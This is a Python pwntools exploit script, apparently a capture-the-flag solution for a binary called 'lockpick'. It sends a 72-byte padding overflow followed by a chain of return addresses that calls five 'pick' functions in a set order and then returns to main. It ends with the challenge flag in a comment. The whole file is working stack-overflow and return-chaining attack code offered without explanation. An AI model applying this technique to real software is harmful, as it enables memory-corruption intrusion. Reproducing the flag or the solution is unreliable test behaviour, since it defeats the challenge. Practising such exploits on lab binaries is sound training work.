from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b main
continue
'''.format(**locals())

exe = './lockpick'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 72

io = start()

pick1 = p64(elf.sym["pick1"])
pick2 = p64(elf.sym["pick2"])
pick3 = p64(elf.sym["pick3"])
pick4 = p64(elf.sym["pick4"])
pick5 = p64(elf.sym["pick5"])


payload = flat([
    b"A"*offset,
    pick3,
    pick5,
    pick4,
    pick1,
    pick2,
    p64(elf.sym["main"])
    

])

io.sendlineafter(b'?\n', payload)
io.recv()


io.interactive()

#deadface{Y0U_R0PP1Ck_1T}
